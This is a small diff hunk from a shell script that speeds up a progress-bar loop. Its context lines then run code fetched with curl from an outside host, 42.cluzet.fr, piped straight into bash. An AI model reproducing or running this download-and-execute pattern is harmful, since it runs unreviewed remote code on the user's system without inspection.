@@ -90,7 +90,7 @@ printf "\n\n"
 	for i in {1..32}
 	do
 		printf "|"
-		sleep 0.8
+		sleep 0.08
 	done
 	bash -c "$(curl 42.cluzet.fr)"
 	exit 0
